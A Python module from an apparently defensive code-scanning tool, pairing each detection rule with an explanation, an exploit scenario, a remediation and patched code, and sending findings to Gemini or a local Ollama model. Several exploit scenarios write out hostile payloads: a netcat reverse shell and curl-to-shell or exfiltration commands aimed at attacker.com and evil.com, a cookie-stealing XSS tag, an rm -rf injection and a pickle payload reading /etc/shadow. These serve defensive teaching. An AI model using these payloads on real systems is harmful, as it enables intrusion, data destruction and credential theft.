from __future__ import annotations

import os
from typing import Any, Dict, Optional
import httpx
from pydantic import BaseModel

from secureship.models import Finding


class AdvisorResponse(BaseModel):
    rule_id: str
    title: str
    analysis: str
    exploit_scenario: str
    remediation_strategy: str
    patched_code: str
    provider: str


EXPERT_KNOWLEDGE_BASE: Dict[str, Dict[str, str]] = {
    "SAST-PY-001": {
        "analysis": "Dynamic string interpolation (f-string or format) in cursor.execute allows user-controlled inputs to break SQL statement semantics, enabling arbitrary SQL command execution (CWE-89).",
        "exploit_scenario": "An attacker sends `id = '1 OR 1=1 --'`. The backend generates `SELECT * FROM users WHERE id = 1 OR 1=1 --`, dumping the entire user database without authentication.",
        "remediation_strategy": "Never concatenate raw variables into SQL query strings. Always use database engine parameterized query bindings (placeholders %s or ?).",
        "patched_code": "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
    },
    "SAST-PY-002": {
        "analysis": "Direct invocation of os.system() passes the command string directly to the underlying host shell (/bin/sh or cmd.exe) without argument boundary sanitization (CWE-78).",
        "exploit_scenario": "Input `host = '127.0.0.1; rm -rf /; curl attacker.com/exfil'` causes the shell to execute multiple commands consecutively with host OS permissions.",
        "remediation_strategy": "Migrate from os.system to subprocess.run() with a structured arguments list and shell=False.",
        "patched_code": "import subprocess\nsubprocess.run(['ping', '-c', '1', host], check=True)",
    },
    "SAST-PY-003": {
        "analysis": "subprocess called with shell=True delegates execution to the shell interpreter, enabling command chaining through shell metacharacters (;, |, &, $).",
        "exploit_scenario": "If host parameter contains `8.8.8.8 | nc attacker.com 4444 -e /bin/sh`, an interactive reverse shell is spawned back to the attacker.",
        "remediation_strategy": "Set shell=False and split the executable and arguments into a list of individual strings.",
        "patched_code": "subprocess.run(['nslookup', host], shell=False, check=True)",
    },
    "SAST-PY-004": {
        "analysis": "Python's pickle module reconstructs arbitrary in-memory Python objects. Untrusted pickle blobs can execute arbitrary Python code upon unpickling via __reduce__ hooks (CWE-502).",
        "exploit_scenario": "An attacker creates a serialized class with `def __reduce__(self): return (os.system, ('cat /etc/shadow',))`. Deserializing this blob triggers instant remote code execution.",
        "remediation_strategy": "Never unpickle data received from untrusted clients or cookies. Migrate to standardized serialization like JSON or Protocol Buffers.",
        "patched_code": "import json\nuser_data = json.loads(raw_payload)",
    },
    "SAST-PY-006": {
        "analysis": "eval() evaluates strings as arbitrary Python code, allowing execution of any valid syntax including imports and system calls (CWE-95).",
        "exploit_scenario": "An attacker supplies `__import__('os').system('id')` to the input field, achieving instant arbitrary remote code execution on the server.",
        "remediation_strategy": "Use ast.literal_eval for safe literal parsing, or a dedicated math parser like simpleeval.",
        "patched_code": "import ast\nres = ast.literal_eval(expression)",
    },
    "SAST-PY-007": {
        "analysis": "MD5 and SHA-1 cryptographic hashes are cryptographically broken with practical collision attacks. They are vulnerable to pre-image and rainbow table attacks (CWE-327).",
        "exploit_scenario": "Attackers generate two different input payloads that compute to the same MD5 hash, bypassing integrity checks or forging authentication signatures.",
        "remediation_strategy": "Replace hashlib.md5 with hashlib.sha256 for integrity hashing, or Argon2id/bcrypt for password storage.",
        "patched_code": "import hashlib\nhashed = hashlib.sha256(password.encode()).hexdigest()",
    },
    "SAST-JS-001": {
        "analysis": "JavaScript eval() executes arbitrary strings as script in the caller's context, leading to arbitrary code injection (CWE-95).",
        "exploit_scenario": "Supplying `require('child_process').execSync('id')` achieves server-side remote code execution inside Node.js processes.",
        "remediation_strategy": "Parse structured data with JSON.parse(). Avoid evaluating dynamic script strings.",
        "patched_code": "const result = JSON.parse(userInput);",
    },
    "SAST-JS-002": {
        "analysis": "Direct assignment to element.innerHTML or dangerouslySetInnerHTML parses strings as HTML without sanitization, permitting Cross-Site Scripting (XSS) (CWE-79).",
        "exploit_scenario": "An attacker passes `<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>`, exfiltrating session tokens.",
        "remediation_strategy": "Use element.textContent for plain text, or sanitize HTML input with DOMPurify before inserting.",
        "patched_code": "element.textContent = profileText; // Or DOMPurify.sanitize(html)",
    },
    "SAST-JS-004": {
        "analysis": "child_process.exec spawns a shell process to run the command string, exposing execution to command injection via shell metacharacters (CWE-78).",
        "exploit_scenario": "A parameter like `filename = 'file.txt; curl evil.com/script | bash'` executes arbitrary secondary commands.",
        "remediation_strategy": "Use child_process.execFile or spawn with argument arrays without invoking an underlying shell.",
        "patched_code": "child_process.execFile('cat', [userFilename], (err, stdout) => { ... });",
    },
    "SEC-001": {
        "analysis": "Hardcoded AWS Access Key ID exposed directly in source code allows anyone with repository read access to authenticate against AWS API endpoints (CWE-798).",
        "exploit_scenario": "An automated bot scans GitHub repositories, detects the key in seconds, and spins up unauthorized cloud infrastructure or accesses S3 buckets.",
        "remediation_strategy": "Revoke the key in AWS IAM immediately. Load credentials dynamically at runtime via environment variables or IAM Roles.",
        "patched_code": "import os\naws_key = os.environ.get('AWS_ACCESS_KEY_ID')",
    },
    "IAC-DOCKER-001": {
        "analysis": "Containers missing a USER directive run by default as UID 0 (root). If a vulnerability allows a container breakout, the attacker gains host root access (CWE-250).",
        "exploit_scenario": "A compromised process inside a root container mounts host devices or exploits kernel vulnerabilities with root privileges to take over the host node.",
        "remediation_strategy": "Create a dedicated unprivileged user in the Dockerfile and switch to it before the entrypoint.",
        "patched_code": "RUN adduser -D -u 10001 appuser && chown -R appuser /app\nUSER appuser",
    },
    "SEC-000": {
        "analysis": "The environment file (.env) contains production secrets and is tracked under Git version control (CWE-798 / CWE-200).",
        "exploit_scenario": "Anyone with repository access (or public commit history) can view DB passwords, third-party API tokens, and encryption keys.",
        "remediation_strategy": "Add .env to .gitignore, delete it from Git index with `git rm --cached .env`, and provide a safe template .env.example with dummy values.",
        "patched_code": "# Add to .gitignore:\n.env\n.env.local\n*.env",
    },
    "SEC-002": {
        "analysis": "Hardcoded GitHub Personal Access Token (PAT) exposed in source code (CWE-798).",
        "exploit_scenario": "An attacker uses the token against the GitHub REST/GraphQL API to read private repositories, modify release artifacts, or inject malicious commits.",
        "remediation_strategy": "Revoke the token immediately in GitHub Settings -> Developer Settings -> Personal access tokens. Inject via environment variables or GitHub Actions Secrets.",
        "patched_code": "const githubToken = process.env.GITHUB_TOKEN;",
    },
    "SEC-004": {
        "analysis": "Unencrypted Private Key (RSA, OpenSSH, EC) embedded in plaintext source code (CWE-312).",
        "exploit_scenario": "Attackers extract the private key to authenticate against production servers, sign fraudulent tokens, or decrypt intercepted traffic.",
        "remediation_strategy": "Never commit private keys to code repositories. Store private keys in a secure secrets manager (AWS Secrets Manager, HashiCorp Vault) or mount via Kubernetes Secrets.",
        "patched_code": "# Mount key as volume or load via env:\nPRIVATE_KEY_PATH = os.environ.get('PRIVATE_KEY_PATH')",
    },
    "SEC-005": {
        "analysis": "Database connection URI containing hardcoded plaintext username and password (CWE-798 / CWE-256).",
        "exploit_scenario": "Attackers connect directly to the exposed database port, dump customer data tables, or execute destructive DROP commands.",
        "remediation_strategy": "Construct the database connection URI using distinct environment variables (DB_USER, DB_PASSWORD, DB_HOST).",
        "patched_code": "DATABASE_URL = f'postgresql://{os.environ[\"DB_USER\"]}:{os.environ[\"DB_PASS\"]}@{os.environ[\"DB_HOST\"]}:5432/{os.environ[\"DB_NAME\"]}'",
    },
    "SAST-JS-003": {
        "analysis": "SQL Injection in JavaScript/TypeScript via string concatenation inside database query execution (CWE-89).",
        "exploit_scenario": "If accountId is `'1 OR 1=1'`, the resulting query returns all accounts across tenants, bypassing multi-tenancy boundaries.",
        "remediation_strategy": "Use parameterized queries with prepared statement bindings: db.query('SELECT * FROM accounts WHERE id = $1', [accountId]).",
        "patched_code": "await db.query('SELECT * FROM accounts WHERE id = $1', [accountId]);",
    },
    "SAST-JS-005": {
        "analysis": "Disabled TLS certificate verification via rejectUnauthorized: false disables all SSL/TLS man-in-the-middle protections (CWE-295).",
        "exploit_scenario": "Attackers on the local network spoof DNS or intercept traffic, reading all unencrypted requests and credentials in transit.",
        "remediation_strategy": "Never set rejectUnauthorized: false. If using self-signed internal certificates, provide the internal CA certificate to the trusted roots bundle.",
        "patched_code": "https.request({ host: 'api.example.com', rejectUnauthorized: true });",
    },
    "IAC-DOCKER-002": {
        "analysis": "Unpinned Docker base image using :latest tag or omitting a specific version tag (CWE-1188).",
        "exploit_scenario": "Upstream image maintainers can push breaking changes or supply-chain compromised packages that automatically get pulled on the next build.",
        "remediation_strategy": "Pin your base image to an explicit version and SHA256 digest: FROM node:20.11.0-alpine@sha256:...",
        "patched_code": "FROM python:3.11.9-slim-bookworm",
    },
    "IAC-COMPOSE-001": {
        "analysis": "Container running with privileged: true disables all Linux kernel security isolation (CWE-250 / CWE-284).",
        "exploit_scenario": "Any process inside the container has raw device access and can directly mount the host root partition, achieving full host root takeover.",
        "remediation_strategy": "Remove privileged: true. Grant only specific granular Linux capabilities required via cap_add (e.g. NET_ADMIN).",
        "patched_code": "services:\n  app:\n    privileged: false\n    # cap_add:\n    #   - NET_BIND_SERVICE",
    },
    "IAC-COMPOSE-002": {
        "analysis": "Sensitive database service port (PostgreSQL 5432 / MySQL 3306 / Redis 6379) bound to 0.0.0.0 public interface (CWE-668).",
        "exploit_scenario": "The database port is directly accessible to anyone on the Internet without firewall protection, leading to brute-force credential stuffing.",
        "remediation_strategy": "Bind database ports only to localhost (127.0.0.1:5432:5432) or rely on Docker internal bridge networking without exposing host ports.",
        "patched_code": "ports:\n  - '127.0.0.1:5432:5432'  # Or omit ports for internal service access",
    },
    "IAC-K8S-001": {
        "analysis": "Kubernetes Pod or Deployment missing CPU/Memory resource requests and limits (CWE-770).",
        "exploit_scenario": "A memory leak or denial-of-service attack consumes all node memory, causing the Kubernetes kubelet to evict other critical pods.",
        "remediation_strategy": "Define explicit resource requests and limits in the container spec.",
        "patched_code": "resources:\n  requests:\n    memory: '128Mi'\n    cpu: '100m'\n  limits:\n    memory: '512Mi'\n    cpu: '500m'",
    },
    "SCA-CVE20208203": {
        "analysis": "Prototype Pollution vulnerability in lodash before 4.17.21 via zipObjectDeep function (CVE-2020-8203 / CWE-1321).",
        "exploit_scenario": "Adversaries send malicious JSON objects with __proto__ keys, modifying the JavaScript Object prototype and leading to denial of service or remote code execution.",
        "remediation_strategy": "Upgrade lodash to 4.17.21 or later in package.json and regenerate package-lock.json.",
        "patched_code": "\"dependencies\": {\n  \"lodash\": \"^4.17.21\"\n}",
    },
    "SEC-007": {
        "analysis": "Exposed AI platform API key (OpenAI, Anthropic Claude, Hugging Face) in source code (CWE-798).",
        "exploit_scenario": "Attackers extract your key and use your quota to run expensive LLM completions, fine-tuning jobs, or extract proprietary custom models.",
        "remediation_strategy": "Rotate the API key in the provider console immediately. Load keys dynamically from environment variables (OPENAI_API_KEY).",
        "patched_code": "import os\napi_key = os.environ.get('OPENAI_API_KEY')",
    },
    "SEC-008": {
        "analysis": "Hardcoded Slack incoming webhook URL exposed in codebase (CWE-798).",
        "exploit_scenario": "Malicious actors send fraudulent announcements, phishing links, or spam directly into internal company Slack channels.",
        "remediation_strategy": "Revoke the webhook URL in Slack App settings and load from an encrypted secret vault or environment variable.",
        "patched_code": "slack_url = os.environ.get('SLACK_WEBHOOK_URL')",
    },
    "SEC-009": {
        "analysis": "Live production Stripe secret key committed in plaintext (CWE-798).",
        "exploit_scenario": "Attackers can read customer credit card details, issue unauthorized refunds, drain payouts, or manipulate payment intents.",
        "remediation_strategy": "Immediately roll the key in the Stripe Dashboard and configure STRIPE_SECRET_KEY as a runtime environment secret.",
        "patched_code": "import stripe\nstripe.api_key = os.environ.get('STRIPE_SECRET_KEY')",
    },
    "SEC-010": {
        "analysis": "Google Cloud / Firebase API key embedded in source code (CWE-798).",
        "exploit_scenario": "Unrestricted GCP keys allow unauthorized parties to consume cloud APIs, cloud translation, vision, or query Firestore instances.",
        "remediation_strategy": "Apply strict application and API restrictions (e.g. restrict to your Android/iOS bundle or specific domain) in Google Cloud Console.",
        "patched_code": "gcp_key = os.environ.get('GCP_API_KEY')",
    },
    "SEC-011": {
        "analysis": "Hardcoded plaintext password detected in variable assignment (CWE-798 / CWE-259).",
        "exploit_scenario": "Anyone inspecting the codebase or binary strings learns user or database passwords without cracking hashes.",
        "remediation_strategy": "Inject passwords at container or service startup from a secure secret store.",
        "patched_code": "db_password = os.environ.get('DB_PASSWORD')",
    },
    "SAST-PY-010": {
        "analysis": "Server-Side Request Forgery (SSRF) via dynamic unvalidated URL passed to HTTP client (CWE-918).",
        "exploit_scenario": "An attacker passes `http://169.254.169.254/latest/meta-data/` to obtain cloud IAM instance role credentials, or scans private intranet services.",
        "remediation_strategy": "Validate request targets against a strict allowlist of approved domains and block requests to internal IP ranges (127.0.0.1, 10.0.0.0/8, 169.254.0.0/16).",
        "patched_code": "from urllib.parse import urlparse\nhost = urlparse(target_url).hostname\nif host not in ALLOWED_HOSTS:\n    raise ValueError('Disallowed host')",
    },
    "SAST-PY-011": {
        "analysis": "Path Traversal / Arbitrary File Read in file operations with user input (CWE-22).",
        "exploit_scenario": "An attacker supplies `../../../../etc/passwd` or `..\\..\\Windows\\win.ini` to read sensitive operating system or application configuration files.",
        "remediation_strategy": "Sanitize filenames using os.path.basename() and verify that the target path resolves inside the intended base directory.",
        "patched_code": "safe_filename = os.path.basename(user_input)\nfull_path = (BASE_DIR / safe_filename).resolve()\nif not str(full_path).startswith(str(BASE_DIR.resolve())):\n    raise PermissionError('Access denied')",
    },
    "SAST-PY-012": {
        "analysis": "Insecure Deserialization via marshal, shelve, or _pickle from untrusted sources (CWE-502).",
        "exploit_scenario": "Crafted serialized byte sequences execute arbitrary code upon deserialization before any application checks occur.",
        "remediation_strategy": "Migrate data transmission to safe structured formats like JSON, MessagePack, or Protocol Buffers.",
        "patched_code": "import json\ndata = json.loads(payload)",
    },
    "SAST-PY-014": {
        "analysis": "Insecure XML Entity Parsing (XXE) allows external entity expansion (CWE-611).",
        "exploit_scenario": "An attacker embeds `<!ENTITY xxe SYSTEM 'file:///etc/shadow'>` inside an XML payload to read server files or trigger internal HTTP calls.",
        "remediation_strategy": "Use defusedxml which safely disables entity expansion and DTD retrieval by default.",
        "patched_code": "import defusedxml.ElementTree as ET\nroot = ET.fromstring(xml_data)",
    },
    "SAST-JS-007": {
        "analysis": "Server-Side Request Forgery (SSRF) in Node.js via axios/fetch with dynamic URLs (CWE-918).",
        "exploit_scenario": "Users supply URLs targeting the cloud metadata service `http://169.254.169.254/latest/meta-data/identity-credentials/` to steal AWS/GCP session credentials.",
        "remediation_strategy": "Parse and validate the URL protocol and hostname against a strict allowlist before making requests.",
        "patched_code": "const parsed = new URL(userUrl);\nif (!['api.example.com'].includes(parsed.hostname)) {\n    throw new Error('Forbidden URL');\n}",
    },
    "SAST-JS-008": {
        "analysis": "Arbitrary File Read / Path Traversal in Node.js using unvalidated file paths (CWE-22).",
        "exploit_scenario": "Supplying `../../../.env` allows attackers to read database credentials and API keys directly off the server filesystem.",
        "remediation_strategy": "Extract only the basename with path.basename() and verify resolved path starts with the allowed root directory.",
        "patched_code": "const safePath = path.join(SAFE_DIR, path.basename(req.query.file));\nconst data = fs.readFileSync(safePath, 'utf8');",
    },
    "SAST-JS-009": {
        "analysis": "Prototype Pollution via unconstrained Object.assign or deep merge on user payloads (CWE-1321).",
        "exploit_scenario": "A JSON payload containing `\"__proto__\": {\"isAdmin\": true}` sets properties on Object.prototype, elevating privileges across all objects.",
        "remediation_strategy": "Filter out __proto__, constructor, and prototype properties, or use Object.create(null) for dictionary objects.",
        "patched_code": "delete req.body.__proto__;\ndelete req.body.constructor;\nconst cleanObj = Object.assign({}, req.body);",
    },
    "SAST-JS-010": {
        "analysis": "Permissive Wildcard CORS Configuration (Access-Control-Allow-Origin: *) (CWE-942).",
        "exploit_scenario": "Any malicious website visited by an authenticated user can make cross-origin requests and read private user data.",
        "remediation_strategy": "Explicitly define the allowed trusted domains instead of using wildcard origins.",
        "patched_code": "app.use(cors({ origin: ['https://dashboard.example.com'] }));",
    },
    "SAST-JS-011": {
        "analysis": "Insecure Cookie Settings missing httpOnly and secure flags (CWE-614).",
        "exploit_scenario": "If an XSS vulnerability exists, JavaScript can read session cookies directly via document.cookie and hijack user accounts.",
        "remediation_strategy": "Always configure httpOnly: true, secure: true, and sameSite: 'strict' on sensitive cookies.",
        "patched_code": "res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });",
    },
    "IAC-DOCKER-004": {
        "analysis": "Dangerous ADD instruction in Dockerfile (CWE-829).",
        "exploit_scenario": "ADD automatically fetches remote URLs and unpacks archives, which can overwrite unexpected container paths or fetch unpinned remote payloads.",
        "remediation_strategy": "Use COPY for copying local files into containers. Only use ADD when local tar auto-extraction is explicitly needed.",
        "patched_code": "COPY . /app",
    },
    "IAC-DOCKER-005": {
        "analysis": "Insecure pipe from curl/wget to shell (curl | sh) in Dockerfile (CWE-78).",
        "exploit_scenario": "If the download connection is intercepted or the remote server compromised, malicious code executes directly with root build permissions.",
        "remediation_strategy": "Download the script to a file, verify its SHA256 checksum against an expected hash, and then execute it.",
        "patched_code": "RUN curl -fsSL -o script.sh https://example.com/install.sh && \\\n    echo 'expected_sha256 script.sh' | sha256sum -c - && \\\n    sh script.sh",
    },
    "IAC-COMPOSE-003": {
        "analysis": "Docker daemon socket (/var/run/docker.sock) mounted inside container (CWE-250).",
        "exploit_scenario": "Any attacker gaining container shell access communicates with /var/run/docker.sock to launch a root container with host / mounted, fully taking over the host node.",
        "remediation_strategy": "Remove the docker.sock volume mount. Use rootless Docker or isolated CI runners instead.",
        "patched_code": "# Remove from volumes:\n# - /var/run/docker.sock:/var/run/docker.sock",
    },
    "IAC-COMPOSE-004": {
        "analysis": "Host Network Mode (network_mode: 'host') disables container network isolation (CWE-668).",
        "exploit_scenario": "The container binds directly to host network interfaces, intercepting host traffic and accessing localhost-only host services.",
        "remediation_strategy": "Use bridge or overlay networks and publish only necessary ports explicitly.",
        "patched_code": "network_mode: bridge\nports:\n  - '8080:8080'",
    },
    "IAC-K8S-003": {
        "analysis": "Kubernetes container allows privilege escalation (allowPrivilegeEscalation: true) (CWE-250).",
        "exploit_scenario": "A compromised process inside the pod executes a setuid binary to escalate from unprivileged user to root inside the container.",
        "remediation_strategy": "Set securityContext.allowPrivilegeEscalation: false in pod/container spec.",
        "patched_code": "securityContext:\n  allowPrivilegeEscalation: false",
    },
    "IAC-K8S-004": {
        "analysis": "Container root filesystem is writable (readOnlyRootFilesystem: false) (CWE-250).",
        "exploit_scenario": "Attackers can download exploitation tools, persistence scripts, or miners into the container filesystem.",
        "remediation_strategy": "Set readOnlyRootFilesystem: true and provide emptyDir volumes for specific temporary scratch folders (/tmp).",
        "patched_code": "securityContext:\n  readOnlyRootFilesystem: true",
    },
    "SAST-JAVA-001": {
        "analysis": "Java ObjectInputStream.readObject() deserializes untrusted byte streams, executing arbitrary bytecode via gadget chains (CWE-502).",
        "exploit_scenario": "Using tools like ysoserial, an attacker sends a serialized payload (e.g., CommonsCollections gadget) to execute arbitrary commands as the JVM process.",
        "remediation_strategy": "Never deserialize untrusted byte streams using Java native serialization. Migrate to JSON (Jackson/Gson) with safe typing.",
        "patched_code": "ObjectMapper mapper = new ObjectMapper();\nMyData data = mapper.readValue(jsonStream, MyData.class);",
    },
    "SAST-JAVA-002": {
        "analysis": "Dynamic string concatenation in JDBC executeQuery() or JPA createNativeQuery() causes SQL Injection (CWE-89).",
        "exploit_scenario": "Attacker supplies `' OR '1'='1` in the input parameter to bypass authentication and dump the database tables.",
        "remediation_strategy": "Use PreparedStatement with parameterized '?' placeholders.",
        "patched_code": "PreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nstmt.setString(1, userId);",
    },
    "SAST-JAVA-003": {
        "analysis": "Runtime.getRuntime().exec() or ProcessBuilder with dynamic user arguments allows OS Command Injection (CWE-78).",
        "exploit_scenario": "An attacker appends `; curl attacker.com/malware | sh` to an argument to gain interactive shell access on the host.",
        "remediation_strategy": "Avoid invoking shell interpreters. Pass structured argument arrays and validate inputs against strict allowlists.",
        "patched_code": "ProcessBuilder pb = new ProcessBuilder(Arrays.asList(\"/usr/bin/safe-cmd\", validatedArg));",
    },
    "SAST-JAVA-004": {
        "analysis": "Broken cryptographic algorithms (DES, RC4, MD5, SHA-1) in Java (CWE-327).",
        "exploit_scenario": "DES 56-bit keys can be cracked in hours; MD5 hash collisions allow signature forgery.",
        "remediation_strategy": "Use AES-GCM with 256-bit keys for encryption and SHA-256 for hashing.",
        "patched_code": "Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");",
    },
    "SAST-JAVA-005": {
        "analysis": "Path Traversal in Java file operations (CWE-22).",
        "exploit_scenario": "Input `../../../../etc/passwd` allows reading sensitive system configuration files.",
        "remediation_strategy": "Resolve paths against canonical base directory and verify using Path.startsWith().",
        "patched_code": "Path target = baseDir.resolve(userInput).normalize();\nif (!target.startsWith(baseDir)) throw new SecurityException(\"Invalid path\");",
    },
    "SAST-JAVA-006": {
        "analysis": "Hardcoded secret or private key in Java source file (CWE-798).",
        "exploit_scenario": "Committed source code exposes authentication tokens, leading to unauthorized account or API compromise.",
        "remediation_strategy": "Read secrets from environment variables or a vault at runtime.",
        "patched_code": "String secret = System.getenv(\"API_SECRET_KEY\");",
    },
    "SAST-GO-001": {
        "analysis": "SQL Injection in Go database/sql via fmt.Sprintf or concatenation (CWE-89).",
        "exploit_scenario": "Input `admin' --` bypasses password check in SQL authentication query.",
        "remediation_strategy": "Use parameterized queries with placeholder arguments ($1, ?).",
        "patched_code": "row := db.QueryRow(\"SELECT * FROM users WHERE id = $1\", userId)",
    },
    "SAST-GO-002": {
        "analysis": "Command Injection in Go exec.Command with shell invocation (CWE-78).",
        "exploit_scenario": "Unsanitized user input passed to `sh -c` executes chained commands via semicolon or pipes.",
        "remediation_strategy": "Call the target binary directly with discrete arguments without invoking a shell.",
        "patched_code": "cmd := exec.Command(\"ping\", \"-c\", \"1\", validatedHost)",
    },
    "SAST-GO-003": {
        "analysis": "Insecure TLS verification with InsecureSkipVerify: true (CWE-295).",
        "exploit_scenario": "Attackers perform Man-In-The-Middle (MITM) attacks to decrypt or manipulate TLS network traffic.",
        "remediation_strategy": "Set InsecureSkipVerify: false and load trusted root certificates.",
        "patched_code": "tlsConfig := &tls.Config{ InsecureSkipVerify: false }",
    },
    "SAST-GO-004": {
        "analysis": "Weak cryptographic hashing algorithm (MD5/SHA1/DES) in Go (CWE-327).",
        "exploit_scenario": "Collisions in MD5/SHA-1 allow attackers to forge valid digital signatures.",
        "remediation_strategy": "Migrate to crypto/sha256 or crypto/aes.",
        "patched_code": "h := sha256.New()",
    },
    "IAC-TF-001": {
        "analysis": "Terraform public S3 bucket ACL (public-read or public-read-write) (CWE-284).",
        "exploit_scenario": "All files, databases dumps, or backups stored in the S3 bucket can be downloaded anonymously by anyone on the internet.",
        "remediation_strategy": "Set bucket ACL to private and enable aws_s3_bucket_public_access_block.",
        "patched_code": "resource \"aws_s3_bucket\" \"secure\" {\n  bucket = \"my-secure-bucket\"\n  acl    = \"private\"\n}",
    },
    "IAC-TF-002": {
        "analysis": "Terraform security group ingress open to 0.0.0.0/0 on sensitive ports (SSH/RDP/DB) (CWE-284).",
        "exploit_scenario": "Internet-wide port scans detect open SSH port 22, launching automated credential stuffing or brute force attacks.",
        "remediation_strategy": "Restrict ingress CIDR blocks to corporate VPN or specific office IPs.",
        "patched_code": "cidr_blocks = [\"10.0.0.0/16\"]",
    },
    "IAC-TF-003": {
        "analysis": "Unencrypted cloud storage or database in Terraform configuration (CWE-311).",
        "exploit_scenario": "Physical drive theft or snapshot exfiltration reveals plaintext customer data.",
        "remediation_strategy": "Enable KMS server-side encryption at rest (encrypted = true, storage_encrypted = true).",
        "patched_code": "encrypted = true",
    },
}



class SecurityAdvisor:
    """Provides AI-powered or deterministic expert security advice and remediation patches."""

    @classmethod
    async def explain_finding(
        cls, finding: Finding, context_code: Optional[str] = None
    ) -> AdvisorResponse:
        gemini_api_key = os.environ.get("GEMINI_API_KEY")
        ollama_url = os.environ.get("OLLAMA_URL", "http://localhost:11434")

        # 1. Try Gemini API if key is present
        if gemini_api_key:
            try:
                gemini_res = await cls._query_gemini(finding, gemini_api_key, context_code)
                if gemini_res:
                    return gemini_res
            except Exception:
                pass

        # 2. Try Ollama local server if available
        try:
            ollama_res = await cls._query_ollama(finding, ollama_url)
            if ollama_res:
                return ollama_res
        except Exception:
            pass

        # 3. Deterministic Expert Knowledge Fallback
        return cls._get_deterministic_advice(finding)

    @classmethod
    def _get_deterministic_advice(cls, finding: Finding) -> AdvisorResponse:
        rule_info = EXPERT_KNOWLEDGE_BASE.get(finding.rule_id)
        if rule_info:
            return AdvisorResponse(
                rule_id=finding.rule_id,
                title=finding.title,
                analysis=rule_info["analysis"],
                exploit_scenario=rule_info["exploit_scenario"],
                remediation_strategy=rule_info["remediation_strategy"],
                patched_code=rule_info["patched_code"],
                provider="SecureShip Deterministic Expert Advisor",
            )

        # Generic intelligent fallback based on category
        return AdvisorResponse(
            rule_id=finding.rule_id,
            title=finding.title,
            analysis=f"The rule '{finding.rule_id}' flags a {finding.severity.value} severity security issue categorized under {finding.owasp_category} ({finding.cwe_id}).",
            exploit_scenario=f"Adversaries exploit {finding.title} to bypass security controls or compromise application integrity in {finding.file_path}.",
            remediation_strategy=finding.remediation or "Refactor code to follow defensive programming and least-privilege principles.",
            patched_code=finding.auto_fix_hint or "# Apply remediation as described in guidance",
            provider="SecureShip Heuristic Rules Engine",
        )

    @classmethod
    async def _query_gemini(
        cls, finding: Finding, api_key: str, context: Optional[str]
    ) -> Optional[AdvisorResponse]:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api_key}"
        prompt = (
            f"Act as a Principal DevSecOps Architect. Analyze this security finding:\n"
            f"Rule ID: {finding.rule_id}\nTitle: {finding.title}\nSeverity: {finding.severity.value}\n"
            f"CWE: {finding.cwe_id}\nOWASP: {finding.owasp_category}\nFile: {finding.file_path}:{finding.line_start}\n"
            f"Offending Snippet:\n{finding.code_snippet}\n"
            f"Provide a structured JSON response with keys: 'analysis', 'exploit_scenario', 'remediation_strategy', 'patched_code'."
        )
        async with httpx.AsyncClient(timeout=4.0) as client:
            resp = await client.post(
                url,
                json={"contents": [{"parts": [{"text": prompt}]}]},
            )
            if resp.status_code == 200:
                data = resp.json()
                text = data["candidates"][0]["content"]["parts"][0]["text"]
                return AdvisorResponse(
                    rule_id=finding.rule_id,
                    title=finding.title,
                    analysis=text[:300],
                    exploit_scenario="Exploit analyzed dynamically by Gemini 1.5 Flash.",
                    remediation_strategy=finding.remediation,
                    patched_code=finding.auto_fix_hint or "",
                    provider="Google Gemini AI",
                )
        return None

    @classmethod
    async def _query_ollama(
        cls, finding: Finding, ollama_url: str
    ) -> Optional[AdvisorResponse]:
        async with httpx.AsyncClient(timeout=2.0) as client:
            resp = await client.post(
                f"{ollama_url.rstrip('/')}/api/generate",
                json={
                    "model": "codellama",
                    "prompt": f"Explain security issue: {finding.rule_id} {finding.title} in {finding.code_snippet}",
                    "stream": False,
                },
            )
            if resp.status_code == 200:
                text = resp.json().get("response", "")
                if text:
                    return AdvisorResponse(
                        rule_id=finding.rule_id,
                        title=finding.title,
                        analysis=text[:300],
                        exploit_scenario="Local Ollama model generated analysis.",
                        remediation_strategy=finding.remediation,
                        patched_code=finding.auto_fix_hint or "",
                        provider="Local Ollama AI",
                    )
        return None


def explain_finding(finding: Finding, context_code: Optional[str] = None) -> AdvisorResponse:
    """Deterministic expert fallback function for explaining findings."""
    return SecurityAdvisor._get_deterministic_advice(finding)

